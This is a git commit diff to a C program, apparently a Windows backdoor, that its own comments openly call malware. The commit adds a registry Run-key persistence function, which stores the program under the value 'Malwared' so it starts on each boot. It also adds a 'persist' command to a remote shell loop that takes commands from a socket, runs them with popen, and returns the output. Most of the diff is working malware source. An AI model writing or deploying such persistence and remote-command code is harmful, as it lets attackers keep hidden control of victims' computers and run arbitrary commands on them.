36d3ea4be39ab3fe6a5ceaaa4e143d30ea14b722
Ozlem <cse.ozlemkorpe@gmail.com>
2020-05-31 18:27:01 +0300

    Added persistance in system registry with bootRun() function

--- LoveIsAnOpenDoor.c
+++ LoveIsAnOpenDoor.c
@@ -13,9 +13,39 @@
 #define bzero(p,size) (void) memset((p), 0, (size))
 
 int sock;
+//Run the program while booting the system
+int bootRun(){
+	char err[128]= "Failed while booting the malware";
+	char suc[128]= "Created the persistence at: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
+	TCHAR  szPath[MAX_PATH];
+	DWORD pathLen= 0;
+
+	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH); //GEt path of the malware
+	if(pathLen == 0) {
+		send(sock, err,sizeof(err),0);
+		return -1;
+	}
+	HKEY NewVal;
+	//Find the system registry
+	// Main registry parts;CLLASSES_ROOT, CURRENT_USER, LOCAL_MACHINE, USERS, CURRENT_CONFIG
+	if(RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),&NewVal)!= ERROR_SUCCESS){
+		send(sock, err, sizeof(err), 0);
+		return -1;
+	}
+	//Set path
+	DWORD pathLenInBytes = pathLen * sizeof(*szPath);
+	if (RegSetValueEx(NewVal, TEXT("Malwared"), 0 ,REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
+		RegCloseKey(NewVal);
+		send(sock,err,sizeof(err),0);
+		return -1;
+	}
+	//Return success message if everything worked well
+	RegCloseKey(NewVal);
+	send(sock, suc, sizeof(suc), 0);
+	return 0;
+}
 
 //Function for cutting  necessary part of commands
-
 char *
 str_cut(char str[], int slice_from, int slice_to){
 	if(str[0] == '\0'){
@@ -45,6 +75,7 @@ str_cut(char str[], int slice_from, int slice_to){
 	return buffer;
 }
 
+//Create shell and store the commands and resonses in buffers
 void Shell(){
 	char buffer[1024];
 	char container[1024];
@@ -56,7 +87,7 @@ void Shell(){
 		bzero(container, sizeof(container));
 		bzero(total_response, sizeof(total_response));
 		recv(sock,buffer,1024,0);
-		
+		//Close the socket and terminate Winsock 
 		if(strncmp("q",buffer,1)==0){
 			closesocket(sock);
 			WSACleanup();
@@ -64,6 +95,8 @@ void Shell(){
 		//Compare if the command is cd operation in the first three char of the buffer
 		}else if(strncmp("cd ", buffer, 3)== 0){ 
 			chdir(str_cut(buffer,3,100)); //Change directory by removing cd part.
+		}else if(strncmp("persist", buffer, 7) == 0){
+			bootRun(); //Run the malware in  every boot.	
 		}else{
 			FILE *fp;
 			fp=popen(buffer, "r");
